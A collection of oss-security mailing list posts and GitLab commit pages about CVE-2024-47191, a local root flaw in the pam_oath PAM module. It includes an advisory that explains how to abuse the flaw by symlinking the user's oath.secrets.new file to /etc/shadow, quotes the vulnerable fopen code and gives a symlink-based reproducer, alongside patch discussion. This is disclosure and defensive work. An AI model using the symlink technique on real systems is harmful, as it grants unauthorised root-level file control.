=== Content from www.openwall.com_d2c05708_20250111_133255.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](../../../2024/10/23/1) [[<thread-prev]](1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20241018014642.GA23101@openwall.com>
Date: Fri, 18 Oct 2024 03:46:42 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-47191: Local root exploit in the PAM module pam_oath.so

On Thu, Oct 17, 2024 at 10:28:41AM +0200, Matthias Gerstner wrote:
> - setgroups() is invoked to drop supplementary group membership.

Looks good to me.

> - the usersfile is checked for additional hard-links; if the link count
>   is larger than one, then the file is rejected. This prevents possible
>   hard link attacks on the end of the unprivileged user.

There's a subtle issue here - another user's (or root's) temporary file
may be hard-linked and st_nlink may be back to 1 after the file is
unlinked by its original creator/user.  For example, tmpfile(3) unlinks
the file right away, yet the calling program is expected to proceed to
use it.  In that case, an attacker winning the race could manipulate
content of another user's temporary file, which that user's program
could then read back and use.

>   With the Linux
>   kernel sysctl protected_hardlinks set to 1 (the usual default on most
>   distributions), this attack will not work either way.

Right.

> In our case it is only a check of st_nlink. This is because we are
> dropping privileges to the owner of the file. If one would drop
> privileges to the to-be-authenticated user, then a check of st_uid would
> be in order as well.

Right.  It appears that given your decision to allow any file owner, you
cannot fully prevent hard link attacks without protected_hardlinks.

> - O_NOCTTY has been added to the open() call of the usersfile. This
>   makes this aspect explicit, although the code already checks that the
>   file is a regular file, so the situation shouldn't arise in the first
>   place.

Oh, I had thought you'd only be able to reliably post-check for regular
file, which would be too late against side-effects on open().  However,
now I realize that you first open with O_PATH, which presumably avoids
side-effects(*), then check fstat(), and only then if everything looks
good you reopen via /proc/self/fd/fd for actual usage.  That's quite a
hack, but yes, O_NOCTTY on reopen should be redundant.

(*) The man page says "Opening a file or directory with the O_PATH flag
requires no permissions on the object itself", so we'd have bigger
problems regardless of your usage if there were side-effects.

> The reason why we accept different ownership of the file is for
> increased backward compatibility. The usersfile feature in pam-oath
> allows for potentially complex scenarios regarding to the ownership of
> the file and it was not previously clearly specified which scenarios are
> supported. When only supporting the simple scenario of the usersfile
> being located directly beneath the to-be-authenticated user's home
> directory, then a lot of things become simpler, as it has been done
> in the upstream approach in a couple of aspects.

OK, this makes sense.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_c37b0f2e_20250111_133254.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2024/10/04/5) [[next>]](2) [[<thread-prev]](../../../2024/10/04/2) [[thread-next>]](../../../2024/10/08/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <878qv251x7.fsf@kaka.sjd.se>
Date: Sat, 05 Oct 2024 11:33:56 +0200
From: Simon Josefsson <simon@...efsson.org>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-47191: Local root exploit in the PAM module pam_oath.so

OATH Toolkit pam_oath usersfile `${HOME}` privilege escalation
--------------------------------------------------------------

Security Vulnerability
----------------------

OATH Toolkit provides two components `liboath` and `pam_oath`.
Pam_oath is normally run as root and assumes that the `usersfile` path
setting value points to a root-controlled and protected file
containing the OATH secrets (cryptographic HMAC keys) for users.

The documentation suggests using a root-owned `/etc/users.oath` and to
do `chmod go-rw /etc/users.oath` on it.  The design assumes that file
permissions are set up to prevent malicious read or writes to the
credential file by unauthorized users.  Whether file permissions are
setup correctly or not is not checked by the code.

On every successful authentication, the file is rewritten to prevent
OTP replay attacks.  The rewriting logic works by acquiring a POSIX
file lock on a newly created `*.lock` file (in the same directory),
and then writing file content to a newly created `*.new` file (also in
the same directory).  File ownership of the new file is set to the
same as the original file.  The original usersfile is replaced
atomically with the newly created file.

With the introduction of the `${HOME}` indirection variable in the
usersfile parameter the design assumptions no longer holds.  The
feature was added in version 2.6.7 released on 2021-05-01.

A typical setup when `${HOME}` is used in a usersfile value such as
`usersfile=${HOME}/.config/oath.secrets` is to allow users to manage
their own credentials.  The file is owned by the user who is
responsible for adding the secret to it, and to set read/write
permissions on the file appropriately.

The security problem is easy to exploit.  To demonstrate the
vulnerability with a vulnerable version and configuration, create a
symbolic link `$HOME/.config/oath.secrets.new` that points to a
privileged file such as `/etc/shadow`.  After successful login as the
user, `pam_oath`/`liboath` has followed the symbolic link and rewrote
the target file with new updated OATH credentials and sets ownership
of that file to the user.  The user is now able to modify
`/etc/shadow`.

We are not aware of any active exploits in the wild of this flaw.

Affected versions and configurations
------------------------------------

OATH Toolkit pam_oath and liboath version 2.6.7 to version 2.6.11 are
affected.  Version 2.6.12 prevents the attack.

The attack requires that the "usersfile" setting has a file or path
component that is in a vulnerable location.  The common setup with a
write/read-protected `usersfile=/etc/users.oath` setup is not
vulnerable.

While admin's may specify a "usersfile" in a world-writeable directory
like `/tmp` we regard that as a configuration error.  In most
scenarios, only "usersfile" with `${HOME}` in them should be regarded
as a vulnerable configuration.

One vulnerable setting is `usersfile=/home/joe/.config/system.oath`
giving joe the ability to modify root-owned files, assuming a non-root
user joe with write access to anything below `/home/joe`.  This is
somewhat similar to having a system SSH configuration of HostKey
`/home/joe/ssh_hostkey` which we believe is unlikely and also consider
to be a configuration error.

Another example is via the `${USER}` setting as in
`usersfile=/home/${USER}/.config/oath.secrets` giving any non-root
user the ability to control system files, assuming they have write
access to anything below `/home/${USER}`.  We have improved the
documentation regarding `${USER}` to be for those settings where
root-controlled per-user files are desired.  The intended use of
`${USER}` strings are for setups like
`usersfile=/var/oath/oath.${USER}.secrets` where the files are
per-user but owned by root and have file permissions setup to prevent
read/write from the user.  The root-ownership and file permission
should prevent users from being able to reach their OATH credentials
when `${USER}` is used.

The `pam_oath` fix only address configurations that uses `${HOME}` and
not any other vulnerable configurations.  The liboath fix prevent
direct attacks via `*.new` and `*.lock` symlinks, but other scenarios
are possible and the input to `oath_authenticate_usersfile()` MUST be
a trusted filename -- suitable sanitization is application-dependent.

Details
-------

The vulnerable code in liboath is inside
`oath_authenticate_usersfile()`, quoting code from version 2.6.11
which can be reviewed here:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/oath-toolkit-2.6.11/liboath/usersfile.c?ref_type=tags#L324>

The lock file is acquired:

  /* Open lockfile. */
  {
    int l;
    l = asprintf (&lockfile, "%s.lock", usersfile);
    if (lockfile == NULL || ((size_t) l) != strlen (usersfile) + 5)
      return OATH_PRINTF_ERROR;
    lockfh = fopen (lockfile, "w");
    if (!lockfh)
      {
	free (lockfile);
	return OATH_FILE_CREATE_ERROR;
      }
  }

Since `fopen("w")` is used any existing file with the predictable
`*.lock` filename will be opened, including if that file happens to be
a symbolic link that points elsewhere.  The code is run as root, so a
symbolic link pointing to confidential files under `/etc` are happily
opened.  Note that since "w" is used, the file will be automatically
truncated.  So this allows non-root to truncate root-owned files.

Reading on to the `*.new` file handling:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/oath-toolkit-2.6.11/liboath/usersfile.c?ref_type=tags#L360>

    outfh = fopen (newfilename, "w");
    if (!outfh)
      {
	free (newfilename);
	fclose (lockfh);
	free (lockfile);
	return OATH_FILE_CREATE_ERROR;
      }

Similarily, this will open a file for writing, and later code will
essentially copy data from the existing file into the new one.  This
new file is moved back into the original place.

The PAM module invokes `oath_authenticate_usersfile()` in
`pam_oath.c`, which can be shown here:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/oath-toolkit-2.6.11/pam_oath/pam_oath.c?ref_type=tags#L452>

The code is running as root so it may work on an untrustworthy
filename.  The design used to be that admin's specify a trusted
pathname here, but the `${HOME}` use-case broke this design assumption
and the pathnames should then no longer be considered trusted.

Solution
--------

Version 2.6.12 contains the following liboath patch to use `fopen(wx)`:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/3235a52f6b87cd1c5da6508f421ac261f5e33a70>

Some non-glibc and non-ISO C11 platforms needs the following patch to
enable gnulib's `fopen(wx)` workaround:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/3271139989fde35ab0163b558fc29e80c3a280e5>

Then `pam_oath.c` is modified to call seteuid()/setegid() as follows:

<https://gitlab.com/jas/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418>

A patch that applies cleanly to version 2.6.7 found in Debian 12.x
bookworm is available here:

<https://salsa.debian.org/debian/oath-toolkit/-/blob/debian/bookworm-security/debian/patches/pam_oath-seteuid.patch>

We recommend you to upgrade to version 2.6.12.

If that is unpractical we recommended you to apply the patches on top
of your earlier version.

Reproducer
----------

Included in the 2.6.12 release is a C program to test if a liboath is
vulnerable or not.  It can be built as follows on a system with
liboath properly installed:

  git clone <https://gitlab.com/oath-toolkit/oath-toolkit.git>
  cd oath-toolkit
  git checkout oath-toolkit-2.6.12
  cd liboath/tests
  cc -o tst_fopen-wx tst_fopen-wx.c $(pkg-config --libs --cflags liboath)
  rm -f cve.oath cve.oath.new cve.sshd-config cve.oath.lock
  printf 'HOTP/E/8\tsilver\t4711\t3132333435363738393031323334353637383930313233343536373839303132\n' > cve.oath
  echo my-magic-cookie > cve.sshd-config
  ln -s cve.sshd-config cve.oath.new
 ./tst_fopen-wx cve.oath silver 670691 4711

When invoked on a Trisquel 11 system with liboath0 and liboath-dev
version 2.6.7-3build1 installed, it will print the following:

  Liboath fopen(wx) bug test for oath.h 2.6.7 liboath.so 2.6.7
  FAIL: Liboath VULNERABLE to fopen(wx) bug.

To test a particular liboath use LD_PRELOAD as follows:

  LD_PRELOAD=/usr/local/lib/x86_64-linux-gnu/liboath.so.0 ./tst_fopen-wx cve.oath silver 670691 4711

The liboath/tests/tst_fopen-wx.sh script can be used to setup and
invoke the C program testing two different vulnerable configurations.

Related work
------------

The logic for the usersfile handling was inspired by earlier versions
of mod-authn-otp and pam_google_authenticator although their modern
design appears to be somewhat different from pam_oath's current code.

<https://github.com/archiecobbs/mod-authn-otp>

<https://github.com/google/google-authenticator-libpam/>

While the liboath oath_authenticate_usersfile() vulnerability is not a
typical "time-of-check, time-of-use" race condition (since there is no
check happening in the code) it exhibits the same pattern in the code
since fopen(w) is used instead of fopen(wx).  Running GitLab semantic
analysis (SAST) on the vulnerable code flagged it as problematic:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/security/vulnerabilities/139535897>

<https://gitlab.com/oath-toolkit/oath-toolkit/-/security/vulnerabilities/139535890>

[https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.+Avoid+TOCTOU+race+conditions+while+accessing+files](https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.%2BAvoid%2BTOCTOU%2Brace%2Bconditions%2Bwhile%2Baccessing%2Bfiles)

We have enabled GitLab SAST and Coverity scanning of OATH Toolkit and
will review the findings.

SUSE's alternative patch and advisory can be found via:

<https://security.opensuse.org/2024/10/04/oath-toolkit-vulnerability.html>

It rely on Linux kernel specific features and uses fork() which was
determined to be contrary to the liboath design, which aims to be
portable to macOS and *BSD and beyond.  This alternative patch may be
used by some vendors, and it is assumed to fix the security problem.

History
-------

Fabian Vogt reported this issue in private e-mail on 2024-08-08.
Matthias Gerstner reported the issue as a GitLab confidential issue on
2024-08-20.  These reports came in during vacation time and were not
read by the maintainer.  Salvatore Bonaccorso reached out on
2024-09-29 via SMS, and the progress since then has been tracked in
the bug tracker:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/43>

Credits
-------

The problem was discovered by Fabian Vogt of SUSE.  An initial patch
against liboath was developed by Matthias Gerstner of SUSE Security
Team.  An alternative and portable patch to liboath and pam_oath were
developed by Simon Josefsson.

Download attachment "[signature.asc](1/1)" of type "application/pgp-signature" (256 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_5d59959b_20250111_133254.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2024/10/06/1) [[next>]](2) [[<thread-prev]](../../../2024/10/05/1) [[thread-next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20241008025402.GA2904@openwall.com>
Date: Tue, 8 Oct 2024 04:54:02 +0200
From: Solar Designer <solar@...nwall.com>
To: Simon Josefsson <simon@...efsson.org>
Cc: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-47191: Local root exploit in the PAM module pam_oath.so

Hi,

Great work by the SUSE Security Team and upstream!

On Sat, Oct 05, 2024 at 11:33:56AM +0200, Simon Josefsson wrote:
> Solution
> --------
>
> Version 2.6.12 contains the following liboath patch to use `fopen(wx)`:
>
> <https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/3235a52f6b87cd1c5da6508f421ac261f5e33a70>
>
> Some non-glibc and non-ISO C11 platforms needs the following patch to
> enable gnulib's `fopen(wx)` workaround:
>
> <https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/3271139989fde35ab0163b558fc29e80c3a280e5>
>
> Then `pam_oath.c` is modified to call seteuid()/setegid() as follows:
>
> <https://gitlab.com/jas/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418>

This link requires authentication.  I guess you meant to post:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418>

> A patch that applies cleanly to version 2.6.7 found in Debian 12.x
> bookworm is available here:
>
> <https://salsa.debian.org/debian/oath-toolkit/-/blob/debian/bookworm-security/debian/patches/pam_oath-seteuid.patch>
>
> We recommend you to upgrade to version 2.6.12.
>
> If that is unpractical we recommended you to apply the patches on top
> of your earlier version.

I note a few things:

1. Neither the SUSE nor the upstream patches change the supplementary
groups.  SUSE patches fork() and then in the child setgid() and
setuid().  Upstream doesn't fork(), but switches with setegid() and
seteuid(), and then back.  If the intent is solely to avoid the need for
fchown(), then that's sufficient.  Hopefully, along with SUSE's openat()
and flags magic or with upstream's fopen(, "x"), nothing more is needed.
However, if the intent is to avoid even trying to access files in user's
directory with potentially excessive privileges, then supplementary
groups should also be switched or dropped.

I'm sorry I didn't get around to bringing this maybe-issue up in the
pre-disclosure thread on the distros list (which Johannes Segitz from
SUSE kindly started on September 27).  I feel it was not essential to
discuss/address pre-disclosure, and is fine to discuss in public now.

2. Switching task credentials from library code is tricky, given that
the program could have threads that don't expect this.  set*id() and
setgroups() libc calls would typically affect all threads.  On Linux,
it's possible to affect the current thread only, which e.g. we do in
tcb[1] by using setfs*id() and direct setgroups() syscall (the latter
only in our recent git code at this time, previously we used the libc
function).  I assume Simon is aware of the Linux specific way, but
deliberately chose not to do this in upstream oath-toolkit for
portability to non-Linux.

[1] <https://www.openwall.com/tcb/> and <https://github.com/openwall/tcb>

3. There's similar concern about the program's signal handlers, which
isn't addressed by switching credentials only of the current thread.
Maybe such library code should be temporarily blocking signals?  This
becomes tricky and dirty.  In tcb, we just accept this risk for now
(that a signal handler may run with unexpectedly dropped privileges).

4. As Simon also noted:

> SUSE's alternative patch and advisory can be found via:
>
> <https://security.opensuse.org/2024/10/04/oath-toolkit-vulnerability.html>
>
> It rely on Linux kernel specific features and uses fork() which was
> determined to be contrary to the liboath design, which aims to be
> portable to macOS and *BSD and beyond.

I agree fork() from library code is tricky, but not so much because of
portability concerns.  Again, the program using the library may not
expect it to ever have an extra child process.  Sure the library should
use waitpid() on this specific process, yet the program could receive
unexpected SIGCHLD.  The combination of the program's threads and our
fork() could also have unexpected consequences.

In tcb, we chose to make usage of fork() a PAM module option, so that by
enabling it the distro or sysadmin acknowledges that it's acceptable in
the specific PAM configuration.  Our usage of fork() is for a different
reason, though: "Using this option one can be sure that after a call to
pam_end(3) there is no sensitive data left in the process' address
space."  I wonder if this property would also be relevant in
oath-toolkit patches if more processing is moved to the child process,
or if this would be excessive under the relevant threat models.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from gitlab.com_2acbe5aa_20250111_133256.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

Unverified
**Commit
3235a52f**

authored
Oct 01, 2024
by
**[![Simon Josefsson's avatar](https://secure.gravatar.com/avatar/bbcf4eaca84bcb1c3d191a2d8868291127d072e3ed2cc92e8b835d8a009020d8?s=96&d=identicon "Simon Josefsson")](/jas)
[Simon Josefsson](/jas)**

[Browse files](/oath-toolkit/oath-toolkit/-/tree/3235a52f6b87cd1c5da6508f421ac261f5e33a70)

### Improve liboath usersfile write handling.

```

Thanks to Fabian Vogt of SUSE for finding and reporting the problem.

Open *.lock and *.new file in exclusive mode to treat any existing
files as an error, including if it is a symbolic link.

Modify so that if opening the lock file fails, it returns
OATH_FILE_LOCK_ERROR instead of OATH_FILE_CREATE_ERROR so that the
latter is reserved to mean error to create the target file.

Fix bug that causes stale *.lock file to be kept around on failure to
open *.new file.
```

parent
[e39b5264](/oath-toolkit/oath-toolkit/-/commit/e39b526425886c1b9589f755a195470d98703d6b)

Loading

Loading

Loading

* [Changes
  1](/oath-toolkit/oath-toolkit/-/commit/3235a52f6b87cd1c5da6508f421ac261f5e33a70)

[Hide whitespace changes](/oath-toolkit/oath-toolkit/-/commit/3235a52f6b87cd1c5da6508f421ac261f5e33a70?action=show&controller=projects%2Fcommit&id=3235a52f6b87cd1c5da6508f421ac261f5e33a70&namespace_id=oath-toolkit&project_id=oath-toolkit&w=1)
[Inline](/oath-toolkit/oath-toolkit/-/commit/3235a52f6b87cd1c5da6508f421ac261f5e33a70?view=inline)
[Side-by-side](/oath-toolkit/oath-toolkit/-/commit/3235a52f6b87cd1c5da6508f421ac261f5e33a70?view=parallel)

Loading

* [![](https://secure.gravatar.com/avatar/698e95cb14c7fd35aa61e1f5372e18f8c4ca3a47ccb011a1c733c23c17ea93ef?s=128&d=identicon)](/AMDmi3)

  [Dmitry Marakasov](/AMDmi3)
  @AMDmi3

  ·

  [Oct 04, 2024](#note_2143684416)

  I hope you are aware that "x" is not portable unless you use C11.

  Edited Oct 04, 2024 by [Dmitry Marakasov](/AMDmi3)
  I hope you are aware that "x" is not portable unless you use C11.
* [![](https://secure.gravatar.com/avatar/bbcf4eaca84bcb1c3d191a2d8868291127d072e3ed2cc92e8b835d8a009020d8?s=128&d=identicon)](/jas)

  [Simon Josefsson](/jas)
  @jas

  ·

  [Oct 05, 2024](#note_2144220730)

  Author
  Owner

  We are using gnulib's fopen() replacement:

  <https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/3235a52f6b87cd1c5da6508f421ac261f5e33a70/liboath/gl/fopen.c#L123>

  According to the documentation the replacement is fairly widely supported:

  <https://www.gnu.org/software/gnulib/manual/html_node/fopen.html>

  Are you are aware of any platform where this wouldn't work on?

  Of course, there could be bugs in the gnulib replacement code, but at least there is code to support `x` on non-glibc platforms present.

  /Simon

  We are using gnulib's fopen() replacement:
  https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/3235a52f6b87cd1c5da6508f421ac261f5e33a70/liboath/gl/fopen.c#L123
  According to the documentation the replacement is fairly widely supported:
  https://www.gnu.org/software/gnulib/manual/html\_node/fopen.html
  Are you are aware of any platform where this wouldn't work on?
  Of course, there could be bugs in the gnulib replacement code, but at least there is code to support `x` on non-glibc platforms present.
  /Simon
* [![](https://secure.gravatar.com/avatar/698e95cb14c7fd35aa61e1f5372e18f8c4ca3a47ccb011a1c733c23c17ea93ef?s=128&d=identicon)](/AMDmi3)

  [Dmitry Marakasov](/AMDmi3)
  @AMDmi3

  ·

  [Oct 07, 2024](#note_2145958944)

  > We are using gnulib's fopen() replacement:

  Wasn't aware of it. In this case my statement is not valid as it was referring to libc fopen().

  > We are using gnulib's fopen() replacement:
  Wasn't aware of it. In this case my statement is not valid as it was referring to libc fopen().

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment



=== Content from gitlab.com_2466de0c_20250111_133257.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

**Commit
60d9902b**

authored
Nov 15, 2020
by
**[![Jason Graham's avatar](https://secure.gravatar.com/avatar/bc7f5b95d7daaa6302054e899826b5e5e44da5d18d8f91e4db9dae957e5f7c7b?s=96&d=identicon "Jason Graham")](/jgraha8)
[Jason Graham](/jgraha8)**

[Browse files](/oath-toolkit/oath-toolkit/-/tree/60d9902b5c20f27e70f8e9c816bfdc0467567e1a)

### Added support for user based placeholder values in pam\_oath usersfile string.

```

These changes introduce the the "${USER}" and "${HOME}" placeholder
values for the "usersfile" string in the pam_oath configuration
file. The placeholder values allow the user credentials file to be
stored in a file path that is relative to the user, and mimicks
similar behavior found in google-authenticator-libpam.

The motivation for these changes is to allow for non-privileged
processes to use pam_oath (e.g., for 2FA with
xscreensaver). Non-priviledged and non-suid programs are unable to use
pam_oath. These changes are a proposed alternative to a suid helper
binary as well.

The user credential file ownership is automatically adjusted if
"${USER}" and/or "${HOME}" is used. The default is the owner of the
calling process (as returned by getuid()), but if either placeholder
is used the UID of the user is obtained from
pam_modutil_getpwnam(). The ownership is changed just prior the
renaming the new modified user crediential file, while the lock is in
place.
```

parent
[04943fe1](/oath-toolkit/oath-toolkit/-/commit/04943fe17b5e33ee875ec6f03c3f00036bd69f4c)

Loading

Loading

Loading

* [Changes
  6](/oath-toolkit/oath-toolkit/-/commit/60d9902b5c20f27e70f8e9c816bfdc0467567e1a)

[Hide whitespace changes](/oath-toolkit/oath-toolkit/-/commit/60d9902b5c20f27e70f8e9c816bfdc0467567e1a?action=show&controller=projects%2Fcommit&id=60d9902b5c20f27e70f8e9c816bfdc0467567e1a&namespace_id=oath-toolkit&project_id=oath-toolkit&w=1)
[Inline](/oath-toolkit/oath-toolkit/-/commit/60d9902b5c20f27e70f8e9c816bfdc0467567e1a?view=inline)
[Side-by-side](/oath-toolkit/oath-toolkit/-/commit/60d9902b5c20f27e70f8e9c816bfdc0467567e1a?view=parallel)

Loading

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment



=== Content from gitlab.com_1b95018d_20250111_133256.html ===


[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

Unverified
**Commit
32711399**

authored
Oct 02, 2024
by
